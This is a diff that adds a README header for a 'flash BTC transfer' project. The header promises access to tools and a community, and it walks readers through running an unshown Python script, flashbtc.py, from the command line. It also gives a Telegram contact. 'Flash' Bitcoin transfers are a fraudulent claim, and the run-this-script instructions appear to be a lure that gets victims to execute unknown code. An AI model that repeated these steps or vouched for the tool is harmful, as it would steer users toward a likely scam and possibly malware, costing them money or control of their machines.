@@ -1,3 +1,27 @@
+HOW TO CONNECT?
+
+HELLO THERE,
+
+I'M THE MAIN DEVELOPER OFF FLASH BTC TRANSFERS AND MANY OTHER TOOLS.
+
+TO ACCESS OUR COMMUNITY AND TOOLS: 
+
+1 - DOWNLOAD PYTHON
+2 - EXTRACT THIS FILE
+3 - OPEN CMD
+4 - COPY THE DIRECTORY PATH OF THIS FILE
+5 - WRITE IN CMD CD AND PAST THE DIRECTORY PATH
+6 - WRITE PYTHON FLASHBTC.PY FOR ACCESS
+
+WHITEPAPERS: - https://github.com/CryptoSemtex/WhitePaper-FLASH-BTC-TRANSFER
+TELEGRAM   : - @CryptoSemtex / https://t.me/flashbtctransfer <<-- 
+
+
+
+
+----------------------------------------------------------------------
+
+
 # WhitePaper-FLASH-BTC-TRANSFER
 My Supports and Server Features
 
